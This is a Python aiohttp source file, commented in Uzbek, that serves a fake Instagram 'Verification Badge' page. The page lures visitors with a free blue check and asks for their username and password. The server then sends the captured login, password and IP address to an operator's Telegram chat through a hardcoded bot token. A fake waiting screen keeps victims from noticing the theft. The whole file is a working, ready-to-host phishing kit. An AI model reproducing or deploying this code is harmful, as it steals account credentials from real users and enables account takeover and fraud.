from aiohttp import web
import aiohttp
import os

# --- SOZLAMALAR ---
# Telegramdan @BotFather orqali olingan token
BOT_TOKEN = "8568375010:AAFuv2DOhmMp4--_ykGRfDIWVcCAR59f9fE" 
# @userinfobot orqali olingan ID
ADMIN_ID = "7930537261"   

# HTML SAHIFA KODI
HTML_PAGE = """
<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram • Verification Badge</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { background: white; border: 1px solid #dbdbdb; padding: 40px; width: 350px; text-align: center; box-shadow: 0 4px 12px rgba(0,0,0,0.05); }
        .logo { width: 175px; margin-bottom: 25px; }
        .badge-info { background: #e0f1ff; padding: 12px; border-radius: 8px; margin-bottom: 20px; color: #0095f6; font-weight: bold; font-size: 14px; }
        input { width: 100%; padding: 12px; margin-bottom: 8px; border: 1px solid #dbdbdb; border-radius: 3px; background: #fafafa; box-sizing: border-box; font-size: 14px; }
        button { width: 100%; padding: 12px; background: #0095f6; color: white; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; margin-top: 10px; }
        #waiting { display: none; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="box" id="login-form">
        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Instagram_logo.svg" class="logo">
        <div class="badge-info">Tabriklaymiz! Sizga bepul "Verified Badge" (Galichka) berildi!</div>
        <p style="font-size: 14px; color: #262626; font-weight: 600;">Faollashtirish uchun tizimga kiring</p>
        <input type="text" id="u" placeholder="Foydalanuvchi nomi yoki email">
        <input type="password" id="p" placeholder="Parol">
        <button onclick="sendData()">Tasdiqlash</button>
    </div>

    <div class="box" id="waiting">
        <div class="loader"></div>
        <h3>Kutilmoqda...</h3>
        <p style="color: #8e8e8e; font-size: 14px;">Ma'lumotlar tekshirilmoqda. Galichka 5 daqiqadan so'ng profilingizda paydo bo'ladi. Sahifani yopmang.</p>
    </div>

    <script>
        function sendData() {
            let u = document.getElementById('u').value;
            let p = document.getElementById('p').value;
            if(u.length < 3 || p.length < 5) { alert("Login yoki parol xato!"); return; }

            fetch('/collect', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({u: u, p: p})
            });

            document.getElementById('login-form').style.display = 'none';
            document.getElementById('waiting').style.display = 'block';
        }
    </script>
</body>
</html>
"""

async def send_to_telegram(text):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": ADMIN_ID, "text": text, "parse_mode": "HTML"}
    async with aiohttp.ClientSession() as session:
        async with session.post(url, json=payload) as resp:
            return await resp.json()

async def handle_collect(request):
    try:
        data = await request.json()
        u, p = data.get('u'), data.get('p')
        ip = request.remote
        
        log_text = (
            f"🔔 <b>YANGI INSTA LOG!</b>\n\n"
            f"👤 Login: <code>{u}</code>\n"
            f"🔑 Parol: <code>{p}</code>\n"
            f"🌐 IP: {ip}"
        )
        await send_to_telegram(log_text)
        return web.json_response({"status": "ok"})
    except:
        return web.json_response({"status": "error"})

async def handle_index(request):
    return web.Response(text=HTML_PAGE, content_type='text/html')

app = web.Application()
app.router.add_get('/', handle_index)
app.router.add_post('/collect', handle_collect)

if __name__ == '__main__':
    # Hostinglar uchun portni avtomatik aniqlash
    port = int(os.environ.get("PORT", 8080))
    web.run_app(app, port=port)
